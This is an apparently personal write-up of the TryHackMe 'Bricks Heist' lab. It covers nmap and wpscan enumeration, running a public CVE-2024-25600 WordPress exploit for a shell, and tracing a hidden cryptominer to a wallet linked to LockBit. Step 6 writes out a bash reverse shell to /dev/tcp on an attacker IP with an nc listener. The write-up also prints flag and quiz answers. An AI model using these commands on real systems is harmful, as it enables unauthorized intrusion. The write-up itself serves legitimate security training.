# 🛡️ TryHackMe Writeup – TryHack3M: Bricks Heist

> **Room URL**: https://tryhackme.com/room/tryhack3mbricksheist
> **Date Completed**:
> **Difficulty**: 🟢 Easy
---

## 📜 Room Description
Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key.

---

### 🔍 **Enumeration**

1. Simple `nmap` scan to see what we could find.
  -`sudo nmap -sS -p- -Pn --vv 10.10.47.3`
  
  - `Discovered open port 443/tcp on 10.10.47.3`
  - `Discovered open port 22/tcp on 10.10.47.3`
  - `Discovered open port 3306/tcp on 10.10.47.3`
  - `Discovered open port 80/tcp on 10.10.47.3`
  
2. We have a look to see if we can find any interesting website:
   http://10.10.47.3 -> No luck, error 405
   https://10.10.47.3 -> Returns a webserver
   ![image](https://github.com/user-attachments/assets/ebae9f26-e6a1-4e11-bdb2-cfed6a903e76)

3. Appears to be a wordpress site so I ran `~ ❯ wpscan --url https://bricks.thm --disable-tls-checks --api-token <MY API TOKEN>`.
  I had to include `--disable-tls-checks` as this site does not have a valid certificate.
  This lead us to some interesting discoveries. Including a RCE vuln:
![image](https://github.com/user-attachments/assets/a130be0b-c18d-485a-8b23-a9ae718bd19f)

4. Onto Github we go, here we downloaded the code:
   https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py
   We then ran the exploit:
   `~/Downloads ❯ python3 CVE-2024-25600.py`
   Success we have a shell
   `Shell>`

5. To solve the first TryHackMe question we had to locate a hidden .txt file
   `ls -a`
  This provided us with a txt file that after reading we found the first flag
  ```bash
650c844110baced87e1606453b93f22a.txt
Shell> cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```
6. The next task was to locate a suspicious service running. We had trouble with shell stability so now my task was to gain a more stable connection.
   Perhaps I should have done this first, something to consider next time.
   - On our machine we ran `nc -lnvp 8888` to start listening for an incoming connection
   - On our target machine we ran `Shell> bash -c 'exec bash -i &>/dev/tcp/10.8.121.74/8888 <&1'`
   - This gave us a much more stable shell to work with. Although it did take a few attempts as I had issues remembering how to view running processes.
  
7. Finding a suspicious process was done by running
  - `systemctl`
  - Followed by `systemctl | grep running` to narrow down the services
  - We then found the following service:
  - `ubuntu.service                                   loaded active     running   TRYHACK3M`
  - Running `systemctl status ubuntu.service` returned the following:
  - ![image](https://github.com/user-attachments/assets/0e50a08e-5b73-4098-8c7b-a201b8aab187)
  - `nm-inet-dialog` is the answer to the next TryHackMe question as this is the name of the suspicious service running!
  - `ubuntu.service` also answers the TryHackMe question: *What is the service name affiliated with the suspicious process?*

8. Now it was time to find the log file name of the miner instance to answer the next TryHackMe quesiton.
   - We headed to where the service was running `cd /lib/NetworkManager`
   - And checked the contents `ls -a`
   - There was no outright log file here but one that stands out is `inet.conf`
   - Lets read it:
   - `cat inet.conf`
   - ![image](https://github.com/user-attachments/assets/a5e42b9a-5d3c-4422-ba16-40b7d23811e6)
   - The output certainly looks like a log file. And entering `inet.conf` is correct for the log filename question.
   - Included in this log was this long string of numbers which appeared throughout:
   - ![image](https://github.com/user-attachments/assets/c3bbd096-0610-43f9-a234-1fecff3cfc8c)
   - After a bit of googling, we decided to put this into https://gchq.github.io/CyberChef/
   - Which gave us `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`
   - This almost looks like an address but is too long! On inspection I noticed it repeats itself twice. So we cut it in half
   - `bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`
   - This ended up being the correct answer and is the wallet address!

9. The last task was to find what threat group other wallets, which were involved with this wallet, were a part of.
   - This was as simple as looking online for transactions this wallet was involved in
   - Then cross checking each wallet online until something interesting came up.
   - This wallet address `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r` was involved in the LockBit threat group and thus concluded our final question.
  
## 📖 Key Take-aways
- Most of this room was spent re-learning how to do things as it has been sometime
- It was good for understanding blind spots in my knowledge without being overly complicated
- My task now is adding to my documentation for future reference
